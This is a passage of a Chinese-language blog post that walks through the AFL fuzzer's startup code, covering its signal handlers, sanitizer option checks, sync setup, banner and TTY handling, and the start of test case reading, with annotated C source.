class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 必需参数检查</span></span><br><span class="line"><span class="keyword">if</span> (optind == argc || !in_dir || !out_dir) <span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 信号处理器设置</span></span><br><span class="line"><span class="built_in">setup_signal_handlers</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. ASAN选项检查</span></span><br><span class="line"><span class="built_in">check_asan_opts</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 同步设置</span></span><br><span class="line"><span class="keyword">if</span> (sync_id) <span class="built_in">fix_up_sync</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 目录冲突检查</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, out_dir))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Input and output directories can&#x27;t be the same&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">save_cmdline</span>(argc, argv);          <span class="comment">// 保存命令行</span></span><br><span class="line"><span class="built_in">fix_up_banner</span>(argv[optind]);       <span class="comment">// 设置横幅</span></span><br><span class="line"><span class="built_in">check_if_tty</span>();                    <span class="comment">// 检查终端</span></span><br><span class="line"><span class="built_in">get_core_count</span>();                  <span class="comment">// 获取CPU核心数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_AFFINITY</span></span><br><span class="line"><span class="built_in">bind_to_free_cpu</span>();                <span class="comment">// 绑定到空闲CPU</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">check_crash_handling</span>();            <span class="comment">// 检查崩溃处理</span></span><br><span class="line"><span class="built_in">check_cpu_governor</span>();              <span class="comment">// 检查CPU调速器</span></span><br><span class="line"><span class="built_in">setup_post</span>();                      <span class="comment">// 设置后处理</span></span><br><span class="line"><span class="built_in">setup_shm</span>();                       <span class="comment">// 设置共享内存</span></span><br><span class="line"><span class="built_in">init_count_class16</span>();              <span class="comment">// 初始化计数分类</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">setup_dirs_fds</span>();                  <span class="comment">// 设置目录和文件描述符</span></span><br><span class="line"><span class="built_in">read_testcases</span>();                  <span class="comment">// 读取测试用例</span></span><br><span class="line"><span class="built_in">load_auto</span>();                       <span class="comment">// 加载自动令牌</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">pivot_inputs</span>();                    <span class="comment">// 转换输入格式</span></span><br><span class="line"><span class="keyword">if</span> (extras_dir) <span class="built_in">load_extras</span>(extras_dir);  <span class="comment">// 加载字典</span></span><br><span class="line"><span class="keyword">if</span> (!timeout_given) <span class="built_in">find_timeout</span>();       <span class="comment">// 自动检测超时</span></span><br></pre></td></tr></table></figure><h4 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers();"></a>setup_signal_handlers();</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">setup_signal_handlers</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">sigaction</span> sa;</span><br><span class="line">  sa.sa_handler   = <span class="literal">NULL</span>;</span><br><span class="line">  sa.sa_flags     = SA_RESTART;</span><br><span class="line">  sa.sa_sigaction = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">sigemptyset</span>(&amp;sa.sa_mask);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 各种停止信号的处理 */</span></span><br><span class="line">  sa.sa_handler = handle_stop_sig;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGHUP, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGINT, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGTERM, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 执行超时通知 */</span></span><br><span class="line">  sa.sa_handler = handle_timeout;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGALRM, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 窗口大小改变 */</span></span><br><span class="line">  sa.sa_handler = handle_resize;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGWINCH, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* SIGUSR1: 跳过当前条目 */</span></span><br><span class="line">  sa.sa_handler = handle_skipreq;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGUSR1, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 我们不关心的信号 */</span></span><br><span class="line">  sa.sa_handler = SIG_IGN;</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGTSTP, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">sigaction</span>(SIGPIPE, &amp;sa, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="handle-stop-sig"><a href="#handle-stop-sig" class="headerlink" title="handle_stop_sig"></a>handle_stop_sig</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">handle_stop_sig</span><span class="params">(<span class="type">int</span> sig)</span> </span>&#123;</span><br><span class="line">  stop_soon = <span class="number">1</span>; </span><br><span class="line">  <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(child_pid, SIGKILL);</span><br><span class="line">  <span class="keyword">if</span> (forksrv_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(forksrv_pid, SIGKILL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>设置stop_soon标志为1，表示AFL应该开始优雅退出</p></li><li><p>终止所有子进程和fork服务器进程</p></li><li><p>响应SIGHUP（终端断开）、SIGINT（Ctrl+C）和SIGTERM（终止请求）信号</p></li></ul><h5 id="handle-timeout"><a href="#handle-timeout" class="headerlink" title="handle_timeout"></a>handle_timeout</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">handle_timeout</span><span class="params">(<span class="type">int</span> sig)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    child_timed_out = <span class="number">1</span>; </span><br><span class="line">    <span class="built_in">kill</span>(child_pid, SIGKILL);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (child_pid == <span class="number">-1</span> &amp;&amp; forksrv_pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    child_timed_out = <span class="number">1</span>; </span><br><span class="line">    <span class="built_in">kill</span>(forksrv_pid, SIGKILL);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>设置child_timed_out标志，表示目标程序执行超时</p></li><li><p>强制终止超时的子进程</p></li><li><p>响应SIGALRM信号，用于执行时间限制控制</p></li></ul><h5 id="handle-skipreq"><a href="#handle-skipreq" class="headerlink" title="handle_skipreq"></a>handle_skipreq</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">handle_skipreq</span><span class="params">(<span class="type">int</span> sig)</span> </span>&#123;</span><br><span class="line">  skip_requested = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>设置skip_requested标志，允许跳过当前测试用例</p></li><li><p>响应SIGUSR1信号，提供手动干预模糊测试过程的能力</p></li></ul><h5 id="忽略的信号"><a href="#忽略的信号" class="headerlink" title="忽略的信号"></a>忽略的信号</h5><ul><li><p>SIGTSTP（Ctrl+Z）：防止AFL被挂起</p></li><li><p>SIGPIPE（管道破裂）：防止在写入已关闭的管道时程序终止</p></li></ul><h4 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts"></a>check_asan_opts</h4><p>用于验证内存安全工具的环境变量配置是否符合要求。这个函数主要检查ASAN（AddressSanitizer）和MSAN（MemorySanitizer）的配置选项，确保它们以最适合模糊测试的方式设置。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">check_asan_opts</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  u8* x = <span class="built_in">getenv</span>(<span class="string">&quot;ASAN_OPTIONS&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (x) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;abort_on_error=1&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom ASAN_OPTIONS set without abort_on_error=1 - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;symbolize=0&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom ASAN_OPTIONS set without symbolize=0 - please fix!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  x = <span class="built_in">getenv</span>(<span class="string">&quot;MSAN_OPTIONS&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (x) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;exit_code=&quot;</span> <span class="built_in">STRINGIFY</span>(MSAN_ERROR)))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom MSAN_OPTIONS set without exit_code=&quot;</span></span><br><span class="line">            <span class="built_in">STRINGIFY</span>(MSAN_ERROR) <span class="string">&quot; - please fix!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strstr</span>(x, <span class="string">&quot;symbolize=0&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Custom MSAN_OPTIONS set without symbolize=0 - please fix!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AFL要求ASAN（AddressSanitizer）配置包含以下选项：</p><p><code>abort_on_error=1</code></p><ul><li><p>功能：当ASAN检测到内存错误时立即终止程序</p></li><li><p>重要性：确保AFL能够捕获到崩溃，而不是让程序继续执行</p></li><li><p>如果缺少：AFL会显示致命错误并终止</p></li></ul><p><code>symbolize=0</code></p><ul><li><p>功能：禁用ASAN的符号化错误报告</p></li><li><p>重要性：防止ASAN生成详细的错误报告，这会干扰AFL的崩溃检测机制</p></li><li><p>如果缺少：AFL会显示致命错误并终止</p></li></ul><p>对于MSAN（MemorySanitizer），AFL要求：</p><p><code>exit_code=MSAN_ERROR</code></p><ul><li><p>功能：设置MSAN检测到错误时的退出代码为特定值（MSAN_ERROR）</p></li><li><p>重要性：允许AFL准确识别由未初始化内存使用导致的崩溃</p></li><li><p>如果缺少：AFL会显示致命错误并终止</p></li></ul><p><code>symbolize=0</code></p><ul><li><p>功能：与ASAN相同，禁用符号化错误报告</p></li><li><p>重要性：确保错误报告不会干扰AFL的崩溃检测</p></li><li><p>如果缺少：AFL会显示致命错误并终止</p></li></ul><p>当使用AFL与ASAN&#x2F;MSAN一起进行模糊测试时，应该设置以下环境变量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export ASAN_OPTIONS=abort_on_error=1:symbolize=0:detect_leaks=0</span><br><span class="line">export MSAN_OPTIONS=exit_code=86:symbolize=0</span><br></pre></td></tr></table></figure><h4 id="fix-up-sync"><a href="#fix-up-sync" class="headerlink" title="fix_up_sync"></a>fix_up_sync</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">fix_up_sync</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  u8* x = sync_id;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode)</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;-S / -M and -n are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (skip_deterministic) &#123;</span><br><span class="line">    <span class="keyword">if</span> (force_deterministic)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;use -S instead of -M -d&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;-S already implies -d&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (*x) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isalnum</span>(*x) &amp;&amp; *x != <span class="string">&#x27;_&#x27;</span> &amp;&amp; *x != <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Non-alphanumeric fuzzer ID specified via -S or -M&quot;</span>);</span><br><span class="line">    x++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strlen</span>(sync_id) &gt; <span class="number">32</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Fuzzer ID too long&quot;</span>);</span><br><span class="line"></span><br><span class="line">  x = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s&quot;</span>, out_dir, sync_id);</span><br><span class="line"></span><br><span class="line">  sync_dir = out_dir;</span><br><span class="line">  out_dir  = x;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!force_deterministic) &#123;</span><br><span class="line">    skip_deterministic = <span class="number">1</span>;</span><br><span class="line">    use_splicing = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主-从模式：</p><ul><li><p>主节点(-M)：执行确定性测试，系统地探索输入空间</p></li><li><p>从节点(-S)：专注于随机变异，提高覆盖率和发现率</p></li></ul><p>共享发现：</p><ul><li><p>所有节点共享一个顶级同步目录</p></li><li><p>每个节点定期检查其他节点的发现</p></li><li><p>有趣的测试用例会被所有节点采纳</p></li></ul><p>工作分配：</p><ul><li><p>主节点处理计算密集型的确定性阶段</p></li><li><p>从节点可以更快地进入随机变异阶段</p></li><li><p>整体提高了模糊测试的效率</p></li></ul><h4 id="save-cmdline-argc-argv"><a href="#save-cmdline-argc-argv" class="headerlink" title="save_cmdline(argc, argv);"></a>save_cmdline(argc, argv);</h4><p>该函数将命令行参数数组（argc&#x2F;argv）转换为单个连续的字符串，并将其存储在全局变量<code>orig_cmdline</code>中，以便在程序的其他部分使用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Make a copy of the current command line. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">save_cmdline</span><span class="params">(u32 argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 len = <span class="number">1</span>, i;</span><br><span class="line">  u8* buf;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; i++)</span><br><span class="line">    len += <span class="built_in">strlen</span>(argv[i]) + <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">  buf = orig_cmdline = <span class="built_in">ck_alloc</span>(len);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; argc; i++) &#123;</span><br><span class="line"></span><br><span class="line">    u32 l = <span class="built_in">strlen</span>(argv[i]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(buf, argv[i], l);</span><br><span class="line">    buf += l;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i != argc - <span class="number">1</span>) *(buf++) = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="fix-up-banner-argv-optind"><a href="#fix-up-banner-argv-optind" class="headerlink" title="fix_up_banner(argv[optind]);"></a>fix_up_banner(argv[optind]);</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">fix_up_banner</span><span class="params">(u8* name)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!use_banner) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sync_id) &#123;</span><br><span class="line"></span><br><span class="line">      use_banner = sync_id;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">      u8* trim = <span class="built_in">strrchr</span>(name, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (!trim) use_banner = name; <span class="keyword">else</span> use_banner = trim + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strlen</span>(use_banner) &gt; <span class="number">40</span>) &#123;</span><br><span class="line"></span><br><span class="line">    u8* tmp = <span class="built_in">ck_alloc</span>(<span class="number">44</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%.40s...&quot;</span>, use_banner);</span><br><span class="line">    use_banner = tmp;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是afl用来设置横幅（banner）的函数</p><h4 id="check-if-tty"><a href="#check-if-tty" class="headerlink" title="check_if_tty()"></a>check_if_tty()</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if we&#x27;re on TTY. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">check_if_tty</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">winsize</span> ws;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_UI&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">OKF</span>(<span class="string">&quot;Disabling the UI because AFL_NO_UI is set.&quot;</span>);</span><br><span class="line">    not_on_tty = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">ioctl</span>(<span class="number">1</span>, TIOCGWINSZ, &amp;ws)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (errno == ENOTTY) &#123;</span><br><span class="line">      <span class="built_in">OKF</span>(<span class="string">&quot;Looks like we&#x27;re not running on a tty, so I&#x27;ll be a bit less verbose.&quot;</span>);</span><br><span class="line">      not_on_tty = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>检查是否是在tty即终端下运行的函数</p><p>剩下的就挑几个有点意思的分析吧</p><h4 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read_testcases"></a>read_testcases</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Read all testcases from the input directory, then queue them for testing.</span></span><br><span class="line"><span class="comment">   Called at startup. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">read_testcases</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">dirent</span> **nl;</span><br><span class="line">  s32 nl_cnt;</span><br><span class="line">  u32 i;</span><br><span class="line">  u8* fn;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Auto-detect non-in-place resumption attempts. */</span></span><br><span class="line"></span><br><span class="line">  fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/queue&quot;</span>, in_dir);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">access</span>(fn, F_OK)) in_dir = fn; <span class="keyword">else</span> <span class="built_in">ck_free</span>(fn);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ACTF</span>(<span class="string">&quot;Scanning &#x27;%s&#x27;...&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We use scandir() + alphasort() rather than readdir() because otherwise,</span></span><br><span class="line"><span class="comment">     the ordering  of test cases would vary somewhat randomly and would be</span></span><br><span class="line"><span class="comment">     difficult to control. */</span></span><br><span class="line"></span><br><span class="line">  nl_cnt = <span class="built_in">scandir</span>(in_dir, &amp;nl, <span class="literal">NULL</span>, alphasort);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nl_cnt &lt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (errno == ENOENT || errno == ENOTDIR)</span><br><span class="line"></span><br><span class="line">      <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;The input directory does not seem to be valid - try again. The fuzzer needs\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    one or more test case to start with - ideally, a small file under 1 kB\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    or so. The cases must be stored as regular files directly in the input\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    directory.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shuffle_queue &amp;&amp; nl_cnt &gt; <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ACTF</span>(<span class="string">&quot;Shuffling queue...&quot;</span>);</span><br><span class="line">    <span class="built_in">shuffle_ptrs</span>((<span class="type">void</span>**)nl, nl_cnt);</span><br><span class="line"></span><br><span class="line">  